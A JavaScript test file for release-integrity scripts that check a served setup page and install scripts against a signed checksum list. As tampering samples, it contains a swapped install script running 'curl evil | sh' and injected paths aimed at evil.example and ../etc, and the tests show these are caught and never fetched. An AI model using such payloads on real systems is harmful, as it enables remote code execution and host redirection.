// @ts-check
// scripts/setup-hashes.mjs and scripts/check-served.mjs: what an origin serves for the setup page and the install line is checked against the signed release.
import "../scripts/mac-test-guard.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";
import { tempHome } from "./helpers.js";
import { setupHashes } from "../scripts/setup-hashes.mjs";
import { checkServed } from "../scripts/check-served.mjs";

const KEYS = crypto.generateKeyPairSync("ed25519");
const OTHER = crypto.generateKeyPairSync("ed25519");
const spki = (/** @type {crypto.KeyObject} */ k) => k.export({ type: "spki", format: "der" }).toString("base64");
const sha = (/** @type {Buffer|string} */ b) => crypto.createHash("sha256").update(b).digest("hex");
const signSums = (/** @type {Buffer} */ sums, /** @type {crypto.KeyObject} */ key) => crypto.sign(null, Buffer.concat([Buffer.from("vyre-release-sums\n"), sums]), key).toString("base64") + "\n";

/** A repo with a built setup page and an install script, its setup.json, and a signed release folder for it. */
function world(t, { sign = /** @type {any} */ (KEYS.privateKey) } = {}) {
  const repo = tempHome(t);
  const files = { "index.html": "<html>setup</html>", "page.js": "export {};\n", "relay/client.js": "// relay\n", "fonts/a.woff2": "font", "flow.test.js": "// not served\n", "config.json": "{}" };
  for (const [p, c] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(repo, "site", "setup", p)), { recursive: true }); fs.writeFileSync(path.join(repo, "site", "setup", p), c); }
  fs.mkdirSync(path.join(repo, "scripts"), { recursive: true });
  fs.writeFileSync(path.join(repo, "scripts", "install-box.sh"), "#!/bin/sh\necho install\n");
  fs.writeFileSync(path.join(repo, "scripts", "install-windows.ps1"), "# install\n");
  const list = setupHashes(repo);
  const rel = path.join(repo, "rel");
  fs.mkdirSync(rel);
  fs.writeFileSync(path.join(rel, "setup.json"), JSON.stringify(list));
  fs.writeFileSync(path.join(rel, "SHA256SUMS"), `${sha(fs.readFileSync(path.join(rel, "setup.json")))}  setup.json\n`);
  if (sign) fs.writeFileSync(path.join(rel, "SHA256SUMS.sig"), signSums(fs.readFileSync(path.join(rel, "SHA256SUMS")), sign));
  return { repo, rel, list };
}
/** An origin that serves the repo's setup page and install script, with optional overrides by path. */
async function origin(t, repo, over = {}) {
  const map = { "/i": path.join(repo, "scripts", "install-box.sh"), "/w": path.join(repo, "scripts", "install-windows.ps1") };
  const walk = (d, rel) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const r = rel ? `${rel}/${e.name}` : e.name; if (e.isDirectory()) walk(path.join(d, e.name), r); else map[r === "index.html" ? "/setup/" : `/setup/${r}`] = path.join(d, e.name); } };
  walk(path.join(repo, "site", "setup"), "");
  const server = http.createServer((req, res) => {
    const p = new URL(req.url || "/", "http://x").pathname;
    if (p in over) { res.writeHead(over[p] === null ? 404 : 200); return res.end(over[p] === null ? "no" : over[p]); }
    if (map[p]) { res.writeHead(200); return res.end(fs.readFileSync(map[p])); }
    res.writeHead(404); res.end("no");
  });
  await new Promise(r => server.listen(0, "127.0.0.1", () => r(undefined)));
  t.after(() => server.close());
  return `http://127.0.0.1:${/** @type {any} */ (server.address()).port}`;
}

test("setup-hashes: every served setup file (a config.json too) and both install scripts, the index at /setup/, and no test file; a missing /w is refused", t => {
  const { list, repo } = world(t);
  assert.deepEqual(list.files.map(f => f[0]), ["/i", "/setup/", "/setup/config.json", "/setup/fonts/a.woff2", "/setup/page.js", "/setup/relay/client.js", "/w"]);
  fs.mkdirSync(path.join(repo, "site", "setup", ".well-known"));
  fs.writeFileSync(path.join(repo, "site", "setup", ".well-known", "x"), "x");
  assert.ok(setupHashes(repo).files.some(f => f[0] === "/setup/.well-known/x"), "a served dotfile is hashed too");
  fs.rmSync(path.join(repo, "scripts", "install-windows.ps1"));
  assert.throws(() => setupHashes(repo), /install-windows\.ps1 is missing/);
  assert.ok(list.files.every(f => /^[0-9a-f]{64}$/.test(f[1])));
});

test("check-served: an origin serving exactly the signed files passes", async t => {
  const w = world(t);
  const r = await checkServed({ origin: await origin(t, w.repo), release: w.rel, key: spki(KEYS.publicKey) });
  assert.deepEqual(r.problems, []);
  assert.equal(r.checked, 7);
});

test("check-served: a changed file, a missing one and a swapped install script are each named", async t => {
  const w = world(t);
  const r = await checkServed({ origin: await origin(t, w.repo, { "/setup/page.js": "export const evil = 1;\n", "/setup/relay/client.js": null, "/i": "#!/bin/sh\ncurl evil | sh\n" }), release: w.rel, key: spki(KEYS.publicKey) });
  assert.equal(r.problems.length, 3, r.problems.join("\n"));
  assert.ok(r.problems.some(p => p.startsWith("/setup/page.js: serves")));
  assert.ok(r.problems.some(p => p.startsWith("/setup/relay/client.js: answered 404")));
  assert.ok(r.problems.some(p => p.startsWith("/i: serves")));
});

test("check-served: a release whose signature is wrong or missing, or whose setup.json is not the listed one, is refused before any fetch", async t => {
  const key = spki(KEYS.publicKey);
  const other = world(t, { sign: OTHER.privateKey });
  await assert.rejects(checkServed({ origin: "http://127.0.0.1:1", release: other.rel, key }), /does not verify/);
  const unsigned = world(t, { sign: null });
  await assert.rejects(checkServed({ origin: "http://127.0.0.1:1", release: unsigned.rel, key }), /no SHA256SUMS\.sig/);
  const tampered = world(t);
  fs.appendFileSync(path.join(tampered.rel, "setup.json"), " ");
  await assert.rejects(checkServed({ origin: "http://127.0.0.1:1", release: tampered.rel, key }), /not the file the signed SHA256SUMS lists/);
});

test("check-served: a path in the signed list that is not a plain one-slash path is refused and never fetched", async t => {
  const w = world(t);
  const list = JSON.parse(fs.readFileSync(path.join(w.rel, "setup.json"), "utf8"));
  list.files.push(["@evil.example/x", "0".repeat(64)], ["//evil.example/x", "0".repeat(64)], ["/a/../etc", "0".repeat(64)]);
  fs.writeFileSync(path.join(w.rel, "setup.json"), JSON.stringify(list));
  fs.writeFileSync(path.join(w.rel, "SHA256SUMS"), `${sha(fs.readFileSync(path.join(w.rel, "setup.json")))}  setup.json\n`);
  fs.writeFileSync(path.join(w.rel, "SHA256SUMS.sig"), signSums(fs.readFileSync(path.join(w.rel, "SHA256SUMS")), KEYS.privateKey));
  const seen = [];
  const r = await checkServed({ origin: "http://127.0.0.1:1", release: w.rel, key: spki(KEYS.publicKey), fetch: async (url) => { seen.push(String(url)); return new Response("x", { status: 404 }); } });
  assert.equal(r.problems.filter(p => /not a plain path/.test(p)).length, 3);
  assert.ok(!seen.some(u => /evil|\.\./.test(u)), seen.join(","));
});
